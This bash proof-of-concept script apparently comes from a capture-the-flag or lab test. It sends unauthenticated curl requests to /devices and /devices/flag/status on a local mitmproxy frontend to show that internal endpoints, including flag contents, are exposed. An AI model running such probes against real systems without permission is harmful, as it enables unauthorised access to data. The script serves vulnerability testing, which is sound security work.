#!/bin/bash

# POC: Exposed Internal Endpoints - Information Disclosure via /devices/flag/status
# Target: mitmproxy frontend on port 32768
# Objective: Access internal endpoints without authentication and retrieve sensitive information

TARGET_HOST="localhost"
TARGET_PORT="32768"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "POC: Exposed Internal Endpoints"
echo "=========================================="
echo ""

# Test 1: Access /devices endpoint (should return device inventory)
echo "[*] Test 1: Accessing /devices endpoint (unauthenticated)"
echo "    URL: ${TARGET_URL}/devices"
echo ""

RESPONSE1=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/devices")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
BODY1=$(echo "$RESPONSE1" | head -n -1)

echo "[+] HTTP Status Code: $HTTP_CODE1"
if [ "$HTTP_CODE1" = "200" ]; then
    echo "[+] SUCCESS: Endpoint is accessible without authentication"
    echo "[+] Response contains device information:"
    echo "$BODY1" | head -n 20
    echo "..."
else
    echo "[-] Endpoint returned: $HTTP_CODE1"
fi

echo ""
echo "=========================================="
echo ""

# Test 2: Access /devices/flag/status endpoint (should expose flag contents)
echo "[*] Test 2: Accessing /devices/flag/status endpoint (unauthenticated)"
echo "    URL: ${TARGET_URL}/devices/flag/status"
echo ""

RESPONSE2=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/devices/flag/status")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)
BODY2=$(echo "$RESPONSE2" | head -n -1)

echo "[+] HTTP Status Code: $HTTP_CODE2"
if [ "$HTTP_CODE2" = "200" ]; then
    echo "[+] SUCCESS: Flag status endpoint is accessible without authentication"
    echo "[+] Response contains:"
    echo "$BODY2"
    
    # Check if flag content is in the response
    if echo "$BODY2" | grep -q "Flag:"; then
        echo ""
        echo "[!] CRITICAL: Flag file contents exposed in HTTP response!"
    fi
else
    echo "[-] Endpoint returned: $HTTP_CODE2"
fi

echo ""
echo "=========================================="
echo ""

# Test 3: Verify no authentication is required (try without cookies)
echo "[*] Test 3: Verifying no authentication is required"
echo "    Making request without any session cookies or auth headers"
echo ""

RESPONSE3=$(curl -s -w "\n%{http_code}" -b "" "${TARGET_URL}/devices/flag/status")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n 1)

if [ "$HTTP_CODE3" = "200" ]; then
    echo "[+] SUCCESS: Endpoint accessible without any authentication"
    echo "[+] Confirms that internal endpoints are exposed publicly"
else
    echo "[-] Unexpected response code: $HTTP_CODE3"
fi

echo ""
echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "[+] Internal endpoints are exposed to public access"
echo "[+] No authentication required to access sensitive information"
echo "[+] Flag file contents can be retrieved via HTTP request"
echo "[+] System configuration information is disclosed"
echo "=========================================="